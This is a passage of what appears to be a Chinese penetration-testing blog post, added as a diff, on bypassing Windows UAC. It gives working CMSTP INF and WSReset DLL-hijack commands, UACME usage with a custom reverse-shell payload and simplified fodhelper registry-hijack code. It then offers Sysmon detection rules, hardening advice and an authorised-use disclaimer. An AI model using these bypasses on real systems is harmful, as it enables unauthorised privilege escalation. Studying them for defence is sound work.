class="section">[RunPreSetupCommandsSection]</span></span><br><span class="line">C:\Windows\System32\cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="section">[CustInstDestSectionAllUsers]</span></span><br><span class="line">49000,<span class="attr">49001</span>=AllUSer_LDIDSection,<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="section">[AllUSer_LDIDSection]</span></span><br><span class="line">&quot;HKLM&quot;,&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE&quot;,&quot;ProfileInstallPath&quot;,&quot;%UnexpectedError%&quot;,&quot;&quot;</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;UACBypass&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;UACBypass&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmstp.exe /s C:\Users\Public\uac_bypass.inf</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-WSReset-exe"><a href="#5-2-WSReset-exe" class="headerlink" title="5.2 WSReset.exe"></a>5.2 WSReset.exe</h3><p><code>WSReset.exe</code> 自动提升，加载 <code>AppxPackaging.dll</code> 等 DLL，利用 DLL 路径劫持：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Copy-Item</span> .\AppxPackaging.dll C:\Users\Public\Downloads\</span><br><span class="line"><span class="variable">$env:Path</span> = <span class="string">&quot;C:\Users\Public\Downloads;&quot;</span> + <span class="variable">$env:Path</span></span><br><span class="line"><span class="built_in">Start-Process</span> C:\Windows\System32\WSReset.exe</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、UACME-工具使用"><a href="#六、UACME-工具使用" class="headerlink" title="六、UACME 工具使用"></a>六、UACME 工具使用</h2><p><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME</a> 是 hfiref0x 维护的开源工具，收录 60+ 种 UAC 绕过方法：</p>
+<table>
+<thead>
+<tr>
+<th>编号</th>
+<th>方法</th>
+<th>原理</th>
+<th>适用版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>23</td>
+<td>fodhelper</td>
+<td>注册表 ms-settings 劫持</td>
+<td>Win10&#x2F;11</td>
+</tr>
+<tr>
+<td>33</td>
+<td>eventvwr</td>
+<td>MSC 注册表劫持</td>
+<td>Win7 - Win10 1607</td>
+</tr>
+<tr>
+<td>39</td>
+<td>ComputerDefaults</td>
+<td>同 fodhelper 路径</td>
+<td>Win10&#x2F;11</td>
+</tr>
+<tr>
+<td>41</td>
+<td>sdclt</td>
+<td>control.exe 路径劫持</td>
+<td>Win10</td>
+</tr>
+<tr>
+<td>44</td>
+<td>WSReset</td>
+<td>Appx DLL 劫持</td>
+<td>Win10</td>
+</tr>
+<tr>
+<td>54</td>
+<td>CMSTP</td>
+<td>INF 命令执行</td>
+<td>Win8 - Win11</td>
+</tr>
+<tr>
+<td>61</td>
+<td>DiskCleanup</td>
+<td>schtasks 劫持</td>
+<td>Win10</td>
+</tr>
+</tbody></table>
+<p>使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">akagi32.exe          <span class="comment"># 列出所有方法</span></span><br><span class="line">akagi32.exe 23       <span class="comment"># fodhelper 方法</span></span><br><span class="line">akagi64.exe 39       <span class="comment"># ComputerDefaults 方法</span></span><br><span class="line">akagi32.exe 23 <span class="string">&quot;C:\Users\Public\reverse.exe&quot;</span>  <span class="comment"># 自定义 payload</span></span><br></pre></td></tr></table></figure>
+
+<p>核心源码简化（方法23）：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ucmMethod23</span><span class="params">()</span> &#123;</span><br><span class="line">    CreateKey(HKCU, <span class="string">L&quot;Software\\Classes\\ms-settings\\shell\\open\\command&quot;</span>);</span><br><span class="line">    SetValue(HKCU, commandKey, <span class="string">L&quot;&quot;</span>, payloadPath);</span><br><span class="line">    SetValue(HKCU, commandKey, <span class="string">L&quot;DelegateExecute&quot;</span>, <span class="string">L&quot;&quot;</span>);</span><br><span class="line">    CreateProcess(<span class="string">L&quot;C:\\Windows\\System32\\fodhelper.exe&quot;</span>, ...);</span><br><span class="line">    Sleep(<span class="number">5000</span>);</span><br><span class="line">    DeleteKey(HKCU, <span class="string">L&quot;Software\\Classes\\ms-settings&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、UAC-绕过流程图"><a href="#七、UAC-绕过流程图" class="headerlink" title="七、UAC 绕过流程图"></a>七、UAC 绕过流程图</h2><pre class="mermaid">graph TD
+    A[获得 Shell Medium IL] --> B[检查 UAC 级别]
+    B -->|级别4: 已关闭| C[直接提权]
+    B -->|级别1-2: 需绕过| D[枚举自动提升程序]
+    D --> E{选择绕过方法}
+    E -->|注册表劫持| F1[fodhelper 23]
+    E -->|注册表劫持| F2[eventvwr 33]
+    E -->|注册表劫持| F3[ComputerDefaults 39]
+    E -->|路径劫持| F4[sdclt 41]
+    E -->|DLL劫持| F5[WSReset 44]
+    E -->|INF执行| F6[CMSTP 54]
+    F1 & F2 & F3 & F4 & F5 & F6 --> G[执行 Payload]
+    G --> H[获得 High IL Shell]
+    H --> I[清理痕迹: 注册表/文件/日志]</pre>
+
+<h2 id="八、检测与防御"><a href="#八、检测与防御" class="headerlink" title="八、检测与防御"></a>八、检测与防御</h2><h3 id="检测：Sysmon-规则"><a href="#检测：Sysmon-规则" class="headerlink" title="检测：Sysmon 规则"></a>检测：Sysmon 规则</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Sysmon</span> <span class="attr">schemaversion</span>=<span class="string">&quot;4.30&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">RegistryEvent</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        \Software\Classes\ms-settings\shell\open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TargetObject</span> <span class="attr">condition</span>=<span class="string">&quot;contains&quot;</span>&gt;</span></span><br><span class="line">        \Software\Classes\mscfile\shell\open\command<span class="tag">&lt;/<span class="name">TargetObject</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">RegistryEvent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProcessCreate</span> <span class="attr">onmatch</span>=<span class="string">&quot;include&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>fodhelper.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Image</span> <span class="attr">condition</span>=<span class="string">&quot;end with&quot;</span>&gt;</span>ComputerDefaults.exe<span class="tag">&lt;/<span class="name">Image</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ParentImage</span> <span class="attr">condition</span>=<span class="string">&quot;is not&quot;</span>&gt;</span>C:\Windows\explorer.exe<span class="tag">&lt;/<span class="name">ParentImage</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ProcessCreate</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">EventFiltering</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Sysmon</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h3><ol>
+<li><strong>UAC 设为”始终通知”（级别1）</strong>——任何提权都弹窗。</li>
+<li><strong>及时安装安全补丁</strong>——微软每月修补已知绕过路径。</li>
+<li><strong>启用 Windows Defender Credential Guard</strong>。</li>
+<li><strong>通过 GPO&#x2F;AppLocker 限制 HKCU 敏感注册表写入</strong>。</li>
+<li><strong>部署 EDR 并配置 UAC 绕过相关检测规则</strong>。</li>
+</ol>
+<h2 id="九、免责声明"><a href="#九、免责声明" class="headerlink" title="九、免责声明"></a>九、免责声明</h2><blockquote>
+<p><strong>本文内容仅供安全研究与授权的渗透测试使用。</strong> 未经系统所有者明确书面授权，对任何系统实施本文描述的技术均属违法行为。作者不承担因滥用本文信息而导致的任何法律责任。</p>
+<p>合法使用场景：已授权的渗透测试、内部红队演练、安全研究实验室环境、CTF 竞赛。</p>
+<p><strong>请始终遵守相关法律法规及授权范围。</strong></p>
+</blockquote>
+<h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>UAC 绕过持续存在的根源：</p>
+<ul>
+<li><strong>自动提升白名单不可移除</strong>：大量系统组件依赖此机制。</li>
+<li><strong>HKCU 注册表可写</strong>：当前用户天生可修改，是注册表劫持温床。</li>
+<li><strong>DLL 搜索顺序攻击面</strong>：非安全目录加载 DLL 的劫持始终可能。</li>
+</ul>
+<p>实战中优先尝试 <strong>fodhelper（方法23）</strong> 和 <strong>ComputerDefaults（方法39）</strong>，在当前主流 Windows 版本中成功率最高。</p>
+<hr>
+<p><strong>参考资源：</strong></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/hfiref0x/UACME">UACME - Defeating Windows User Account Control</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works">Microsoft Docs - How User Account Control Works</a></li>
+<li><a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1548/002/">MITRE ATT&amp;CK - T1548.002: Bypass User Account Control</a></li>
+<li><a target="_blank" rel="noopener" href="https://lolbas-project.github.io/">LOLBAS Project</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/CSRF-principle-exploitation-defense/" rel="prev" title="CSRF 跨站请求伪造 — 原理、绕过与防御">
+                  <i class="fa fa-angle-left"></i> CSRF 跨站请求伪造 — 原理、绕过与防御
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Windows-privesc-kernel-driver/" rel="next" title="Windows提权：内核与驱动漏洞">
+                  Windows提权：内核与驱动漏洞 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
